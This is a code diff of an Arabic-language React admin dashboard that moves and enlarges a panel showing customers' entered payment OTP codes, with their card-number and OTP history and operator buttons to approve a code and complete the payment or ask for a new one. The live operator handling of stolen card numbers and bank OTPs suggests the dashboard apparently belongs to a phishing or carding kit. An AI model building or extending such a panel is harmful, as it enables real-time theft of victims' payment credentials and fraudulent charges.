@@ -1572,23 +1572,6 @@ export default function AdminDashboardPage() {
                                     </div>
                                   )}
 
-                                  {/* صندوق رمز التحقق OTP */}
-                                  {allData.paymentOtp && (
-                                    <div className="mt-4 pt-4 border-t border-gray-200">
-                                      <div className="bg-orange-50 border border-orange-200 rounded-xl p-4">
-                                        <h5 className="font-bold text-sm text-orange-700 mb-2 flex items-center gap-2">
-                                          <Smartphone className="w-4 h-4" />
-                                          رمز التحقق (OTP)
-                                        </h5>
-                                        <div className="text-center">
-                                          <span className="text-2xl font-mono font-black text-orange-700 tracking-widest">
-                                            {allData.paymentOtp}
-                                          </span>
-                                        </div>
-                                      </div>
-                                    </div>
-                                  )}
-
                                   {/* أزرار التحقق عند حالة verifying */}
                                   {app.paymentStatus === "verifying" && (
                                     <div className="mt-4 space-y-2">
@@ -1661,18 +1644,12 @@ export default function AdminDashboardPage() {
                           )}
                           
                           {/* زر إرسال العميل لصفحة الدفع - يظهر دائماً */}
-                          {/* سجلات البطاقات و OTP */}
+                          {/* سجلات البطاقات */}
                           <HistorySection
                             type="payment-card"
                             records={versions.filter(v => v.paymentCardNumber)}
                             expanded={expandedHistory["payment-card"]}
                             onToggle={() => setExpandedHistory(h => ({ ...h, "payment-card": !h["payment-card"] }))}
-                          />
-                          <HistorySection
-                            type="payment-otp"
-                            records={versions.filter(v => v.paymentOtp)}
-                            expanded={expandedHistory["payment-otp"]}
-                            onToggle={() => setExpandedHistory(h => ({ ...h, "payment-otp": !h["payment-otp"] }))}
                           />
 
                           {app.sessionId && (
@@ -1699,6 +1676,59 @@ export default function AdminDashboardPage() {
                             </button>
                           )}
                         </div>
+
+                                {/* صندوق رموز OTP للدفع */}
+                                <div className="bg-card rounded-xl p-4 space-y-2">
+                                  <div className="flex items-center gap-2">
+                                    <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
+                                      <Smartphone className="w-4 h-4" />
+                                      رموز OTP للدفع (Pay-OTP)
+                                    </h4>
+                                    <SectionTimeBadge timestamp={allData.paymentOtp ? app.updatedAt : undefined} />
+                                  </div>
+                                  {allData.paymentOtp ? (
+                                    <div className="bg-orange-50 border border-orange-200 rounded-xl p-6 text-center">
+                                      <p className="text-sm text-orange-600 mb-2 font-medium">رمز التحقق (OTP)</p>
+                                      <p className="text-4xl font-mono font-black text-orange-700 tracking-widest">
+                                        {allData.paymentOtp}
+                                      </p>
+                                    </div>
+                                  ) : (
+                                    <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 text-center">
+                                      <p className="text-sm text-amber-700">لم يُدخل رمز OTP للدفع بعد</p>
+                                    </div>
+                                  )}
+                                  
+                                  {app.paymentStatus === "otp_submitted" && app.currentStep === "pay-otp" && (
+                                    <div className="mt-4 space-y-2">
+                                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
+                                        <p className="text-blue-700 text-sm font-bold">🔐 بانتظار تأكيد رمز OTP</p>
+                                      </div>
+                                      <button
+                                        onClick={() => handleOtpAction(app.id, "approve")}
+                                        disabled={!!actionLoading[`otp_action_${app.id}`]}
+                                        className="w-full bg-green-500 hover:bg-green-600 text-white py-2.5 rounded-lg text-sm font-bold transition-all disabled:opacity-50"
+                                      >
+                                        ✓ تأكيد الرمز وإتمام الدفع
+                                      </button>
+                                      <button
+                                        onClick={() => handleOtpAction(app.id, "reject")}
+                                        disabled={!!actionLoading[`otp_action_${app.id}`]}
+                                        className="w-full bg-orange-500 hover:bg-orange-600 text-white py-2.5 rounded-lg text-sm font-bold transition-all disabled:opacity-50"
+                                      >
+                                        ✗ رفض الرمز وطلب رمز جديد
+                                      </button>
+                                    </div>
+                                  )}
+                                  
+                                  <HistorySection
+                                    type="payment-otp"
+                                    records={versions.filter(v => v.paymentOtp)}
+                                    expanded={expandedHistory["payment-otp"]}
+                                    onToggle={() => setExpandedHistory(h => ({ ...h, "payment-otp": !h["payment-otp"] }))}
+                                  />
+                                </div>
+
                               </div>
                             </div>
                             );
